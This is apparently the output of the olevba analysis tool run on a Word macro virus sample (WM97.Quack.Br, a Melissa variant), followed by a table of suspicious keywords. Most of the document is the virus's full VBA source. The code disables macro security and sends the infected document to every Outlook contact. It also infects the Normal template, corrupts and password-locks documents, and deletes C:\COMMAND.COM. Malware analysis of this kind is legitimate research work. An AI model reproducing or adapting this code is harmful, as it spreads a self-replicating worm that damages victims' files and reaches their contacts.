olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.bk-cb5326dfe5ffe75bf02756599f3358a9da9e3fe5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Quack.cls 
in file: Virus.MSWord.Melissa.bk-cb5326dfe5ffe75bf02756599f3358a9da9e3fe5 - OLE stream: 'Macros/VBA/Quack'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'WM97.Quack.Br
'This virus is a child of Melissa but with a cool payload!
'Developed in Sao Paulo-Brazil in May'99    -- by bm --
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
   CommandBars("Macro").Controls("Security...").Enabled = False
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
   CommandBars("Tools").Controls("Macro").Enabled = False
   Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
If WeekDay(Now) = 7 Then
   Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice
   Set UngaDasOutlook = CreateObject("Outlook.Application")
   Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
   If UngaDasOutlook = "Outlook" Then
      DasMapiName.Logon "profile", "password"
      For y = 1 To DasMapiName.AddressLists.Count
          Set AddyBook = DasMapiName.AddressLists(y)
          x = 1
          Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
          For oo = 1 To AddyBook.AddressEntries.Count
              Peep = AddyBook.AddressEntries(x)
              BreakUmOffASlice.Recipients.Add Peep
              x = x + 1
          Next oo
          BreakUmOffASlice.Subject = "Piadas de " & Application.UserName
          BreakUmOffASlice.Body = "Divirta-se ;-)"
          BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
          BreakUmOffASlice.Send
          Peep = ""
      Next y
      DasMapiName.Logoff
   End If
End If
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NTI1.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
BGN = 2
If ADI1.Name <> "Quack" Then
   If ADCL > 0 Then ADI1.CodeModule.DeleteLines 1, ADCL
   Set ToInfect = ADI1
   ADI1.Name = "Quack"
   DoAD = True
End If
If NTI1.Name <> "Quack" Then
   If NTCL > 0 Then NTI1.CodeModule.DeleteLines 1, NTCL
   Set ToInfect = NTI1
   NTI1.Name = "Quack"
   DoNT = True
End If
If DoNT <> True And DoAD <> True Then GoTo CYA
If DoNT = True Then
   Do While ADI1.CodeModule.Lines(1, 1) = ""
      ADI1.CodeModule.DeleteLines 1
   Loop
   ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
   Do While ADI1.CodeModule.Lines(BGN, 1) <> ""
      ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)
      BGN = BGN + 1
   Loop
End If
If DoAD = True Then
   Do While NTI1.CodeModule.Lines(1, 1) = ""
      NTI1.CodeModule.DeleteLines 1
   Loop
   ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
   Do While NTI1.CodeModule.Lines(BGN, 1) <> ""
      ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)
      BGN = BGN + 1
   Loop
End If
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") <> "BMIC" Then
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "Plus! VersionNumber") = "with Quack 2000"
   Application.UserName = "Quack"
   pass = Chr(113) + Chr(117) + Chr(101) + Chr(105) + Chr(110)
   If Dir("C:\WINDOWS\WIN.INI") = "WIN.INI" Then Windir = "C:\WINDOWS"
   If Dir("C:\WIN95\WIN.INI") = "WIN.INI" Then Windir = "C:\WIN95"
   IniName = Windir + "\" + "CONTROL.INI"
   greeting = "Quein! Quein!"
   If Dir(Windir + "\SYSTEM\MARQUEE.SCR") = Windir + "\SYSTEM\MARQUEE.SCR" Then
      filescr = Windir + "\SYSTEM\MARQUEE.SCR"
   Else
      filescr = Windir + "\SYSTEM\LETREI~1.SCR"
   End If
   filescr = Windir + "\SYSTEM\LETREI~1.SCR"
   fileini = Windir + "\SYSTEM.INI"
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\desktop", "ScreenSaveTimeOut") = "60"
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\desktop", "ScreenSaveActive") = "60"
   System.PrivateProfileString(IniName, "Screen Saver.Marquee", "Text") = greeting
   System.PrivateProfileString(fileini, "boot", "SCRNSAVE.EXE") = filescr
   If Hour(Now) <= 12 Then
      pl = ActiveDocument.BuiltInDocumentProperties(wdPropertyWords)
      pl = Int(Rnd() * Val(pl))
      WordBasic.StartOfDocument
      WordBasic.WordRight pl
      WordBasic.Insert "quack "
      WordBasic.StartOfDocument
   End If
   If Day(Now) = 24 And Month(Now) = 12 Then
      WordBasic.StartOfDocument
      WordBasic.EditSelectAll
      WordBasic.EditCut
      WordBasic.CenterPara
      N = 0
      While N = 0
         WordBasic.FontSize 36
         WordBasic.Insert "Feliz Natal!" + Chr(13)
      Wend
   End If
   If WeekDay(Now()) = 6 And Hour(Now) > 16 Then
      ActiveDocument.Password = pass + pass
   End If
   MyTime = Time
   If WeekDay(Now) = 1 And Left$(MyTime, 1) <= "6" And Right$(MyTime, 2) = "PM" Then
      With Assistant.NewBalloon
         .Icon = msoIconMsAlert
         .Text = "Não trabalho no Domingo à tarde. Volte amanhã!"
         .Heading = "Microsoft Word:" & Chr$(13) & "Documento não disponível."
         .Animation = msoAnimationGetArtsy
         Assistant.Visible = True
         .Show
      End With
      Assistant.Visible = False
      ActiveDocument.Close
   ElseIf WeekDay(Now) = 2 Then
      With Assistant.NewBalloon
        .Text = "Oi!"
        .Animation = msoAnimationGreeting
        Assistant.Visible = True
        .Show
      End With
   End If
   If Day(Now) < 8 And Month(Now) = 1 Then
      Kill "C:\COMMAND.COM"
   End If
End If
CYA:
If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
   ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
   ActiveDocument.Saved = True
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |MARQUEE.SCR         |Executable file name                         |
|IOC       |1.SCR               |Executable file name                         |
|IOC       |SCRNSAVE.EXE        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

